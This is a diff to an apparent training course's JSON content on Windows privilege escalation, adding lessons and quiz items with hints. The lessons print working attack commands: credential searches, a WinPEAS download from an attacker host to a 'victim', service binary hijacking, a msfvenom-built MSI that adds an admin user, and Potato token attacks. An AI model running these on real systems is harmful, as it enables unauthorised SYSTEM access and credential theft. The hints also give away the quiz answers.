@@ -4,43 +4,79 @@
   "tasks": {
     "1": {
       "title": "Windows enumeration",
+      "body": "## The manual Windows privesc list\n\n```cmd\n:: Identity and privileges\nwhoami /all                        :: user, groups AND PRIVILEGES\nwhoami /priv                       :: ONLY privileges (SeImpersonate!)\n\n:: Services and paths\nwmic service get name,startname,pathname | findstr /i \"localSystem\"\n\n:: Scheduled tasks\nschtasks /query /fo LIST /v | findstr /i \"task to run\"\n\n:: Installed patches (is a critical hotfix missing?)\nwmic qfe list                      :: if KBxxx is missing → kernel exploit\n\n:: Credentials on the system\ncmdkey /list                       :: saved credentials\ndir /s /p C:\\Users\\*password* C:\\Users\\*.env\nfindstr /si password *.txt *.ini *.cfg\n```\n\n## WinPEAS: the Windows LinPEAS\n\n```powershell\n# On your machine:\npython3 -m http.server 8080\n# On the victim (PowerShell):\niwr http://TU_IP:8080/winPEASx64.exe -Outfile C:\\Windows\\Temp\\winpeas.exe\nC:\\Windows\\Temp\\winpeas.exe\n```\n\nWinPEAS highlights the likely vectors in red/yellow. Its structure follows the\nsame categories as this room.\n\n## The privilege you are looking for: SeImpersonate\n\n```text\nPRIVILEGES INFORMATION\n----------------------\nSeImpersonatePrivilege        enabled     ← POTATO ATTACK!\nSeChangeNotifyPrivilege       enabled\nSeCreateGlobalPrivilege       enabled\n```\n\nIf your shell (typically a web service) has **SeImpersonatePrivilege**, it can\n\"impersonate\" any client that connects to it. **Potato** attacks\n(Juicy Potato, Rogue Potato, SweetPotato) trick the Windows Update service into\nconnecting to YOUR process, stealing its SYSTEM token.\n\nIt is THE most common escalation on Windows web services (IIS, SQL Server).\n",
       "questions": {
         "privesc-windows-t01-q01": {
-          "prompt": "What command shows YOUR privileges?"
+          "prompt": "What command shows YOUR privileges?",
+          "hint": "whoami /priv"
         },
         "privesc-windows-t01-q02": {
-          "prompt": "What privileges allow token impersonation?"
+          "prompt": "What privileges allow token impersonation?",
+          "hint": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege."
         },
         "privesc-windows-t01-q03": {
-          "prompt": "What command lists services with their account and path?"
+          "prompt": "Which Windows command lists services with their run-as account (startname) and binary path?",
+          "hint": "It is a WMI query on services; you can also do it with Get-CimInstance in PowerShell.",
+          "options": {
+            "a": "wmic qfe list",
+            "b": "wmic service get name,startname,pathname",
+            "c": "whoami /priv",
+            "d": "schtasks /query /fo LIST /v"
+          }
         }
       }
     },
     "2": {
       "title": "Services",
+      "body": "## Unquoted Service Paths: the classic that never dies\n\nWhen a service has a path WITH SPACES and WITHOUT QUOTES:\n\n```text\nC:\\Program Files\\A\\B\\service.exe\n```\n\nWindows resolves it by trying in this order:\n\n```text\nC:\\Program.exe          ← does it exist? if so, it runs THIS one!\nC:\\Program Files\\A.exe  ← does it exist?\nC:\\Program Files\\A\\B.exe\nC:\\Program Files\\A\\B\\service.exe  ← the real one\n```\n\nIf `C:\\` is writable → drop your `Program.exe` (a shell or a command that adds\nyour user to administrators) → restart → the service runs YOUR binary as\nLocalSystem.\n\n```cmd\n:: Find services with unquoted paths\nwmic service get name,pathname | findstr /i \"LocalSystem\" | findstr /v /i \"C:\\Windows\"\n```\n\n## Writable service binaries\n\nMore direct: if the service binary is writable by your user:\n\n```cmd\n:: 1. Generate your payload (msfvenom or adduser.bat)\necho net localgroup administrators tu_usuario /add > C:\\services\\custom.exe\n:: (in practice: a real binary that adds your user)\n\n:: 2. Restart the service\nsc stop CustomSvc\nsc start CustomSvc\n\n:: 3. The service runs your command as LocalSystem\n```\n\n## Service SID and permissions\n\n```cmd\n:: Who can modify the service?\nsc sdshow CustomSvc       :: shows the security descriptor\naccesschk.exe -wcvu CustomSvc   :: (Sysinternals) shows WRITE permissions\n```\n\nIf your user has `SERVICE_CHANGE_CONFIG` over a service that runs as\nLocalSystem → you can change the binary it runs:\n\n```cmd\nsc config CustomSvc binpath= \"C:\\temp\\shell.exe\"\nsc stop CustomSvc && sc start CustomSvc\n```\n",
       "questions": {
         "privesc-windows-t02-q01": {
-          "prompt": "A service runs unquoted path with spaces. Why dangerous?"
+          "prompt": "A service runs C:\\Program Files\\A\\B\\service.exe (with spaces and NO quotes). Why is that dangerous?",
+          "hint": "Windows resolves ambiguous paths by trying candidates from shortest to longest.",
+          "options": {
+            "a": "Because the service can never start",
+            "b": "Windows resolves the spaces by trying earlier paths: C:\\Program.exe runs first if it exists",
+            "c": "Because paths with spaces get encrypted",
+            "d": "Because it forces the service to run as a normal user"
+          }
         },
         "privesc-windows-t02-q02": {
-          "prompt": "A LocalSystem service binary is world-writable. How to escalate?"
+          "prompt": "The service 'CustomSvc' runs as LocalSystem and its binary C:\\services\\custom.exe is writable by everyone. How do you escalate?",
+          "hint": "Think about what the service will run when you start it again.",
+          "options": {
+            "a": "Replace the binary with a shell and restart the service",
+            "b": "Uninstall the service and wait for the next reboot",
+            "c": "Rename the service in the registry",
+            "d": "Just read the binary with a hex editor"
+          }
         },
         "privesc-windows-t02-q03": {
-          "prompt": "What command restarts a Windows service?"
+          "prompt": "What command restarts a Windows service?",
+          "hint": "sc stop / sc start, or net stop / net start"
         }
       }
     },
     "3": {
       "title": "AlwaysInstallElevated and more",
+      "body": "## AlwaysInstallElevated: MSI as SYSTEM\n\nIf the admin enabled this policy, ANY .msi is installed with SYSTEM privileges:\n\n```cmd\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n:: Both must be 0x1 (1 as a DWORD)\n```\n\nIf both are 1:\n\n```bash\n# Generate a malicious .msi with msfvenom\nmsfvenom -p windows/adduser USER=hacker PASS=P@ss -f msi -o /tmp/adduser.msi\n# Transfer it and:\nmsiexec /quiet /qn /i C:\\temp\\adduser.msi\n```\n\n## Potato attacks (SeImpersonate)\n\nThe full family:\n\n| Tool | Windows | Mechanism |\n|---|---|---|\n| Juicy Potato | < Server 2019 | COM + NTLM relay to the Update service |\n| Rogue Potato | Server 2019+ | Same but with a remote relay |\n| SweetPotato | Universal | Several techniques combined |\n| GodPotato | Server 2022+ | Named pipes + PrintSpooler |\n\n```bash\n# SweetPotato (the most versatile in labs):\nsweetpotato.exe -p \"C:\\temp\\shell.exe\"    # runs shell.exe as SYSTEM\n```\n\n## Your final Windows privesc checklist\n\n```text\n□ whoami /priv → SeImpersonate? → Potato\n□ sudo -l equivalent: accesschk -uwcqv user *\n□ Services: unquoted paths (wmic service get pathname)\n□ Services: writable binaries (accesschk -wcvu)\n□ AlwaysInstallElevated: reg query (HKLM + HKCU)\n□ Scheduled tasks: schtasks + writable binaries\n□ Patches: wmic qfe → is a critical one missing? → kernel exploit\n□ Credentials: cmdkey /list, findstr /si password, .env files\n□ AutoRun: reg query HKLM\\...\\Run (writable binaries?)\n□ SAM/SYSTEM: can you read C:\\Windows\\System32\\config\\SAM?\n```\n\nWith privesc mastered on both systems, the next modules (password attacks\nand pivoting) prepare you for the real-world scenario: compromising a full Active\nDirectory domain.\n",
       "questions": {
         "privesc-windows-t03-q01": {
-          "prompt": "What registry key enables AlwaysInstallElevated?"
+          "prompt": "What registry key enables AlwaysInstallElevated?",
+          "hint": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1"
         },
         "privesc-windows-t03-q02": {
-          "prompt": "What attack exploits SeImpersonatePrivilege?"
+          "prompt": "What attack exploits SeImpersonatePrivilege?",
+          "hint": "The Potato family (Juicy/Rogue/Sweet/God)."
         },
         "privesc-windows-t03-q03": {
-          "prompt": "A critical KB is missing. What exploit type?"
+          "prompt": "A critical KB is missing. What exploit type?",
+          "hint": "Kernel exploit (searchsploit windows kernel).",
+          "options": {
+            "a": "Dictionary attack",
+            "b": "Kernel exploit (EternalBlue, etc.)",
+            "c": "Phishing",
+            "d": "None: it is impossible"
+          }
         }
       }
     }
